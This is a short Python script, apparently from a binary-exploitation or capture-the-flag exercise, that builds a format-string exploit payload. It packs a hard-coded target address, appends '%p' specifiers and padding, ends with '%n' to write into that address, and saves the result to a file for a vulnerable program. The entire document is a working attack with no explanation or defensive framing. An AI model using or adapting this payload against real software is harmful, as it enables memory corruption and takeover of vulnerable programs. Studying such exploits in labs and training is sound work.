import struct

# Assume these values are found through your analysis
var_address = 0x0804988c
padding = 31

# Create the payload
payload = struct.pack('I', var_address)
payload += b" %p" * 3
payload += b" " * padding
payload += b" %n"

# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)
